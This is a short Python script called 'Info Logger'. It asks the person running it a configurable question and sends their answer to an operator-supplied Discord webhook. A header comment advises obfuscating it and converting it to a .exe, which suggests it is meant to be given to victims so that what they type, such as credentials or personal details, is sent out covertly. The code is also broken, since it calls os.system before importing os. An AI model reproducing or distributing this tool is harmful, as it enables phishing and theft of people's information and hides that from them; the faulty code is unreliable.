# Coded by @DARKNOSY (https://github.com/DARKNOSY/Info-Logger)
# I recommend using Py2ExeXobfuscator for obfuscating and making this modified file a .exe (https://github.com/DARKNOSY/Py2ExeXobfuscator)

os.system("pip install requests")
os.system("color 4")
os.system("cls")
import requests, os, sys

t = "Info Logger/@DARKNOSY"
# title for console
message_after = "Don't forget to check out the code. It contains all the information you need to modify it to your needs."
# message after post request to webhook is successful
message_after_error = "Error."
# message after post request to webhook is unsuccessful
question_asked = "INSERT-QUESTION-HERE"
# put question instead of "INSERT-QUESTION-HERE" (don't use ' or any related symbols in the question)
webhook_url = "INSERT-YOUR-WEBHOOK-LINK-HERE"
# insert your webhook link instead of INSERT-WEBHOOK-HERE
username = "Python Info Logger / @DARKNOSY"
avatar_url = "https://avatars.githubusercontent.com/u/109553205?v=4"
content = input(f"{question_asked}: ")
banner = "https://avatars.githubusercontent.com/u/109553205?v=4"

payload = {
    "username": username,
    "avatar_url": avatar_url,
    "embeds": [
        {
            "author": {"name": question_asked},
            "image": {"url": banner},
            "description": content,
        }
    ]
}

response = requests.post(webhook_url, json=payload)

if response.status_code == 200:
    print(message_after)
else:
    print(message_after_error)

os.system("pause")
os.system("exit")

# Coded by @DARKNOSY (https://github.com/DARKNOSY/Info-Logger)
